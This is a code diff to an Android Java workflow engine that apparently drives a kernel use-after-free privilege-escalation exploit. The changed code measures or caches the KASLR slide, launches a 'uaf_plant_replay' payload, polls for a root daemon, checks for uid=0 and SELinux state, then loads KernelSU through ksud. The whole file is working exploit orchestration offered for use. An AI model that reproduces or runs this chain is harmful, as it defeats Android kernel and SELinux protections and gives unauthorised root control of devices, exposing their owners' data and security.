@@ -2,8 +2,10 @@ package com.gkeyes.lhasa26.core;
 
 import android.content.res.AssetManager;
 
+import java.util.HashMap;
 import java.util.LinkedHashSet;
 import java.util.Locale;
+import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -17,7 +19,7 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
     public enum State { IDLE, RUNNING, ROOTED, KSU_PENDING, COMPLETE, FAILED }
 
     public static final String[] STEP_LABELS = {
-            "校验内核", "等待系统空闲", "部署程序", "测量内核地址",
+            "校验内核", "部署程序", "测量内核地址", "等待系统空闲",
             "提权执行", "结果验证", "KernelSU 接管"
     };
 
@@ -40,6 +42,7 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
     });
     private final Object logLock = new Object();
     private final StringBuilder sessionLog = new StringBuilder();
+    /** payload 输出去重：同一条日志行只进 sessionLog 一次。 */
     private final Set<String> payloadLines = new LinkedHashSet<>();
     private volatile State state = State.IDLE;
     private volatile long startedAt;
@@ -212,14 +215,16 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
         long chainStart = System.currentTimeMillis();
         step(0);
         status("核对内核");
-        String kernel = run("uname -r", false).output.trim();
+        Map<String, String> preflight = fetchPreflightSnapshot();
+        String kernel = preflight.getOrDefault("UNAME", "");
         append("uname -r = " + kernel);
         if (!BootGuard.isSupportedKernel(kernel)) {
             append(BootGuard.kernelWarning(kernel));
         }
-        String boot = bootId();
-        captureBaseline();
+        String boot = preflight.getOrDefault("BOOT", "");
+        applyBaseline(preflight);
 
+        // 已经持有 KernelSU root 时不要再跑 UAF：内核模块已加载，堆状态与 exploit 假设不同。
         if (rootBeforeRun) {
             clearRunMarker();
             run(BootGuard.clearStageCommand(), true);
@@ -236,13 +241,12 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
             throw new IllegalStateException("上次运行的进程仍在运行，请重启设备后重试。");
         }
         writeRunMarker(boot);
-        String leftover = run("cat " + BootGuard.STAGE_FILE + " 2>/dev/null", true).output;
-        String hint = BootGuard.leftoverStageHint(leftover);
+        String hint = BootGuard.leftoverStageHint(preflight.getOrDefault("STAGE", ""));
         if (!hint.isEmpty()) {
             append("[上次] " + hint);
         }
 
-        String recorded = run("cat " + BootGuard.FAILED_FILE + " 2>/dev/null", true).output.trim();
+        String recorded = preflight.getOrDefault("FAILED", "").trim();
         BootGuard.Retry retry = BootGuard.parseFailure(recorded, boot);
         if (retry == BootGuard.Retry.BLOCKED) {
             throw new IllegalStateException(
@@ -253,10 +257,8 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
             append("（提示）本次开机已为 Permissive，将直接重试 cred 阶段。");
         }
 
-        cleanMemory();
-
         step(1);
-        status("等待系统空闲");
+        status("部署程序");
         final DeployGate deployGate = new DeployGate(DEPLOY_TIMEOUT_MS);
         Thread deploy = new Thread(() -> {
             try {
@@ -267,7 +269,6 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
             }
         }, "lhasa-deploy");
         deploy.start();
-        waitForIdle();
         DeployGate.Result deployResult = deployGate.await(deploy);
         if (deployResult != DeployGate.Result.READY) {
             recordFailedBoot(boot, false);
@@ -275,11 +276,13 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
         }
 
         step(2);
-        status("程序已就位");
+        status("测量本次开机的内核地址");
+        String addressArgument = measureAddress(boot);
 
         step(3);
-        status("测量本次开机的内核地址");
-        String addressArgument = measureAddress();
+        status("等待系统空闲");
+        cleanMemory();
+        waitForIdle();
 
         step(4);
         status("提权执行中，请稍候");
@@ -305,17 +308,17 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
         run(BootGuard.clearFailureCommand(), true);
         clearRunMarker();
         run(BootGuard.clearStageCommand(), true);
+        // 保持 state=ROOTED：若接管失败仍可由 retryKernelSu() 恢复。
         state = State.ROOTED;
         selinuxAfterRoot = enforceNow();
         callbacks.onStatus("已获得临时 ROOT · SELinux " + selinuxAfterRoot);
         append("临时 ROOT 已就绪。");
         append("[归因] 开始时为 shell（未持有 root），结束时获得 uid=0 · SELinux "
                 + (enforceBeforeRun.isEmpty() ? "?" : enforceBeforeRun) + " → " + selinuxAfterRoot);
-        append("[下一步] 自动接管 KernelSU（会加载内核模块，可能重启）。");
-        callbacks.onState(State.ROOTED,
-                "已获得临时 ROOT · 正在自动接管 KernelSU · SELinux " + selinuxAfterRoot);
         append(String.format(Locale.US, "[耗时] 从点击到临时 ROOT 就绪 %.1fs",
                 (System.currentTimeMillis() - chainStart) / 1000.0));
+        append("[下一步] 自动接管 KernelSU（会加载内核模块，可能重启）。");
+        runKernelSuStep();
     }
 
     private void runDiagnosis() throws Exception {
@@ -355,7 +358,7 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
 
     /**
      * KMI 只取「Android 版本 + 内核主次版本」：本机 release 字符串里两者都在。
-     * 现算的好处是 OTA 换主次版本时不用改代码；解析失败回退 android17-6.18。
+     * 接管后的状态探测全部塞进同一条命令，用 __XX__ 标记回读，省掉 4 次远端进程。
      */
     private void runKernelSuStep() {
         try {
@@ -371,20 +374,35 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
                     + "echo \"kmi=$kmi (from $r)\" >> /data/local/tmp/ksu_try.log; "
                     + "/data/local/tmp/pc98260-su -c \"cd /data/local/tmp && ./ksud late-load --kmi $kmi --allow-shell --package-name me.weishu.kernelsu\" "
                     + ">> /data/local/tmp/ksu_try.log 2>&1; echo rc=$? >> /data/local/tmp/ksu_try.log; "
-                    + "for i in 1 2 3 4 5 6 7 8 9 10; do /system/bin/su -c id >> /data/local/tmp/ksu_try.log 2>&1 && break; sleep 0.3; done", true);
-            String log = run("cat /data/local/tmp/ksu_try.log 2>/dev/null", true).output;
-            if (log.trim().isEmpty()) {
-                log = load.output;
+                    + "su_out=\"\"; "
+                    + "for i in 1 2 3 4 5 6 7 8 9 10; do "
+                    + "  su_out=$(/system/bin/su -c id 2>&1); "
+                    + "  echo \"$su_out\" | grep -q 'uid=0' && { echo \"$su_out\" >> /data/local/tmp/ksu_try.log; break; }; "
+                    + "  sleep 0.3; "
+                    + "done; "
+                    + "ksud_v=$(/system/bin/su -c '/data/local/tmp/ksud -V' 2>/dev/null); "
+                    + "enf=$(getenforce 2>/dev/null); "
+                    + BootGuard.clearStageCommand() + "; "
+                    + "echo \"__SU__=$su_out\"; "
+                    + "echo \"__KSUD_V__=$ksud_v\"; "
+                    + "echo \"__ENFORCE__=$enf\"; "
+                    + "echo \"__LOG__\"; "
+                    + "cat /data/local/tmp/ksu_try.log 2>/dev/null", true);
+            String raw = load.output;
+            int logMarker = raw.indexOf("__LOG__\n");
+            String meta = logMarker >= 0 ? raw.substring(0, logMarker) : raw;
+            String log = logMarker >= 0 ? raw.substring(logMarker + 8) : raw;
+            if (!log.trim().isEmpty()) {
+                append(log);
             }
-            append(log);
-            CommandResult suProbe = run("/system/bin/su -c id 2>/dev/null", true);
-            CommandResult ksudProbe = run("/system/bin/su -c '/data/local/tmp/ksud -V' 2>/dev/null", true);
-            append("[KSU] su -c id → " + oneLine(suProbe.output));
-            append("[KSU] ksud -V → " + oneLine(ksudProbe.output));
-            selinuxAfterRoot = enforceNow();
+            String suOut = extractKv(meta, "__SU__=");
+            String ksudV = extractKv(meta, "__KSUD_V__=");
+            String enf = extractKv(meta, "__ENFORCE__=");
+            append("[KSU] su -c id → " + oneLine(suOut));
+            append("[KSU] ksud -V → " + oneLine(ksudV));
+            selinuxAfterRoot = enf.isEmpty() ? enforceNow() : enf;
             append("[SELinux] 最终实测 " + selinuxAfterRoot);
-            run(BootGuard.clearStageCommand(), true);
-            if (suProbe.output.contains("uid=0")) {
+            if (suOut.contains("uid=0")) {
                 state = State.COMPLETE;
                 callbacks.onState(State.COMPLETE, "全部完成 · 已接管 · SELinux " + selinuxAfterRoot);
             } else {
@@ -415,7 +433,7 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
     private void stageKsudIfNeeded() {
         try {
             CommandResult size = run("stat -c %s " + KSUD_FILE + " 2>/dev/null || echo 0", true);
-            long remote = -1L;
+            long remote;
             try {
                 remote = Long.parseLong(size.output.trim());
             } catch (NumberFormatException ignored) {
@@ -477,7 +495,23 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
                 freeKb, reached ? "达标，开跑" : "未达标，仍开跑"));
     }
 
-    private String measureAddress() throws Exception {
+    /** 同一次开机 KASLR slide 不变，命中缓存就跳过 tracefs 采样。 */
+    private String measureAddress(String boot) throws Exception {
+        if (boot != null && !boot.isEmpty()) {
+            String cached = run("cat " + BootGuard.SLIDE_CACHE_FILE + " 2>/dev/null", true).output.trim();
+            String[] parts = cached.split("\\s+");
+            if (parts.length == 3 && boot.equals(parts[0])) {
+                if ("slide".equals(parts[1]) && KernelSupport.isSlideValid(KernelSupport.parseHex(parts[2]))) {
+                    append("slide = " + parts[2] + "（同开机缓存命中，跳过 slide_probe）");
+                    return "--slide " + parts[2];
+                }
+                if ("site".equals(parts[1]) && parts[2].startsWith("0x")) {
+                    append("site = " + parts[2] + "（同开机缓存命中，跳过 slide_probe）");
+                    return "--site " + parts[2];
+                }
+            }
+        }
+
         run(BootGuard.markCommand("probe-slide"), true);
         CommandResult probe = run(BootGuard.withTimeout(SLIDE_PROBE_TIMEOUT_S,
                 "/data/local/tmp/slide_probe"), false);
@@ -489,17 +523,30 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
         String slide = KernelSupport.extractSlide(probe.output);
         if (slide != null && KernelSupport.isSlideValid(KernelSupport.parseHex(slide))) {
             append("slide = " + slide + "（slide_probe）");
+            cacheAddress(boot, "slide", slide);
             return "--slide " + slide;
         }
         String site = KernelSupport.extractSite(probe.output);
         if (site != null) {
             append("site = " + site + "（slide_probe）");
+            cacheAddress(boot, "site", site);
             return "--site " + site;
         }
 
         append("[测量] slide_probe 未给出可用地址（输出里没有 slide=/site=）");
         append("[测量] 改为不带参数运行，让 uaf_plant_replay 用 lhasa_profile.txt 自行判定。");
         return "";
+    }
+
+    private void cacheAddress(String boot, String kind, String value) {
+        if (boot == null || boot.isEmpty()) {
+            return;
+        }
+        try {
+            run("echo '" + boot + " " + kind + " " + value + "' > " + BootGuard.SLIDE_CACHE_FILE, true);
+        } catch (Exception ignored) {
+            // Cache failure must not block the workflow.
+        }
     }
 
     /**
@@ -521,10 +568,19 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
                     "/data/local/tmp/uaf_plant_replay",
                     args,
                     "/data/local/tmp/uaf_replay.log"), true);
-            Thread.sleep(1500L);
+            Thread.sleep(400L);
             boolean exited = false;
             for (int poll = 0; poll < 200; poll++) {
-                String tail = run("tail -n 24 /data/local/tmp/uaf_replay.log 2>/dev/null", true).output;
+                String snap = run(
+                        "echo \"__SOCK__=$([ -S " + ROOTD_SOCKET + " ] && echo 1 || echo 0)\"; "
+                        + "echo \"__ALIVE__=$(" + BootGuard.aliveCommand() + ")\"; "
+                        + "echo \"__TAIL__\"; "
+                        + "tail -n 24 /data/local/tmp/uaf_replay.log 2>/dev/null", true).output;
+                int tailIdx = snap.indexOf("__TAIL__\n");
+                String header = tailIdx >= 0 ? snap.substring(0, tailIdx) : snap;
+                String tail = tailIdx >= 0 ? snap.substring(tailIdx + 9) : "";
+                boolean sockReady = "1".equals(extractKv(header, "__SOCK__="));
+                boolean alive = !"0".equals(extractKv(header, "__ALIVE__="));
                 if (!tail.trim().isEmpty()) {
                     callbacks.onTail(tail);
                     appendPayloadOutput(tail);
@@ -537,24 +593,21 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
                     run(BootGuard.recordFailureCommand(boot, true, false), true);
                     return "payload 报告节点已挂树（holding zombie）· 本次开机禁止重跑，请重启设备";
                 }
-                if (poll % 5 == 4) {
-                    // 只有确认 rootd 已就绪才去连它：在 [stream]/[cred] 阶段连上等于踩脏堆。
-                    boolean rootdReady = tail.contains("[rootd]") || socketExists();
-                    if (rootdReady) {
-                        CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id'", true);
-                        if (isRoot(verify.output)) {
-                            return null;
-                        }
-                    }
-                    if (Integer.parseInt(run(BootGuard.aliveCommand(), true).output.trim()) == 0) {
-                        exited = true;
-                        break;
+                // 只有确认 rootd 已就绪才去连它：在 [stream]/[cred] 阶段连上等于踩脏堆。
+                if (sockReady || tail.contains("[rootd]")) {
+                    CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id'", true);
+                    if (isRoot(verify.output)) {
+                        return null;
                     }
                 }
                 if (outcome == BootGuard.Outcome.RETRY_SAFE) {
                     break;
                 }
-                Thread.sleep(800L);
+                if (!alive) {
+                    exited = true;
+                    break;
+                }
+                Thread.sleep(500L);
             }
             if (exited) {
                 String tail = run("cat /data/local/tmp/uaf_replay.log 2>/dev/null", true).output;
@@ -562,12 +615,18 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
                 if (tail.trim().isEmpty()) {
                     append("[payload] 进程已退出且日志为空");
                 }
+                BootGuard.Outcome postOutcome = BootGuard.classify(tail);
+                if (postOutcome == BootGuard.Outcome.ABORT_BOOT) {
+                    run(BootGuard.recordFailureCommand(boot, true, false), true);
+                    return "payload 报告节点已挂树（holding zombie）· 本次开机禁止重跑，请重启设备";
+                }
+                recordFailedBoot(boot, false);
                 return "payload 提前退出（未进入提权阶段）· 详见上方输出";
             }
             if (attempt < 3) {
                 append("[重试] 第 " + attempt + " 次未命中，重启 payload 再试（" + (attempt + 1) + "/3）");
                 stopPayload();
-                Thread.sleep(1200L);
+                Thread.sleep(1000L);
             }
         }
         return isRoot(run("/data/local/tmp/pc98260-su -c 'id'", true).output) ? null : "";
@@ -636,14 +695,6 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
 
     private CommandResult run(String command, boolean quiet) throws Exception {
         return executor.run(command, quiet);
-    }
-
-    private String bootId() {
-        try {
-            return run("cat /proc/sys/kernel/random/boot_id 2>/dev/null", true).output.trim();
-        } catch (Exception ignored) {
-            return "";
-        }
     }
 
     private void writeRunMarker(String boot) {
@@ -724,13 +775,44 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
         }
     }
 
-    private void captureBaseline() {
+    /** 一次 shell 采集全部前置状态，避免 9 次远端进程启动。 */
+    private Map<String, String> fetchPreflightSnapshot() throws Exception {
+        String cmd = "echo \"UNAME=$(uname -r 2>/dev/null)\"; "
+                + "echo \"BOOT=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)\"; "
+                + "echo \"ID=$(id 2>/dev/null)\"; "
+                + "echo \"ENFORCE=$(getenforce 2>/dev/null)\"; "
+                + "echo \"PATCH=$(getprop ro.build.version.security_patch 2>/dev/null)\"; "
+                + "if [ -x /system/bin/su ]; then echo \"SU=$(/system/bin/su -c id 2>/dev/null)\"; else echo \"SU=\"; fi; "
+                + "echo \"SOCK=$(ls -l " + ROOTD_SOCKET + " 2>/dev/null)\"; "
+                + "echo \"STAGE=$(cat " + BootGuard.STAGE_FILE + " 2>/dev/null)\"; "
+                + "echo \"FAILED=$(cat " + BootGuard.FAILED_FILE + " 2>/dev/null)\"";
+        String out = run(cmd, false).output;
+        Map<String, String> map = new HashMap<>();
+        for (String line : out.split("\\n")) {
+            int eq = line.indexOf('=');
+            if (eq > 0) {
+                map.put(line.substring(0, eq).trim(), line.substring(eq + 1).trim());
+            }
+        }
+        return map;
+    }
+
+    private static String extractKv(String text, String prefix) {
+        for (String line : text.split("\\n")) {
+            if (line.startsWith(prefix)) {
+                return line.substring(prefix.length()).trim();
+            }
+        }
+        return "";
+    }
+
+    private void applyBaseline(Map<String, String> preflight) {
         try {
-            String id = oneLine(run("id 2>/dev/null", true).output);
-            enforceBeforeRun = run("getenforce 2>/dev/null", true).output.trim();
-            String patch = run("getprop ro.build.version.security_patch", true).output.trim();
-            String suProbe = run("/system/bin/su -c id 2>/dev/null", true).output;
-            String socket = run("ls -l " + ROOTD_SOCKET + " 2>/dev/null", true).output.trim();
+            String id = oneLine(preflight.getOrDefault("ID", ""));
+            enforceBeforeRun = preflight.getOrDefault("ENFORCE", "");
+            String patch = preflight.getOrDefault("PATCH", "");
+            String suProbe = preflight.getOrDefault("SU", "");
+            String socket = preflight.getOrDefault("SOCK", "");
             append("[基线] id=" + id + " · SELinux=" + enforceBeforeRun);
             append("[基线] security_patch=" + (patch.isEmpty() ? "未知" : patch)
                     + (patch.isEmpty() ? "" : (patch.compareTo("2026-10-06") < 0
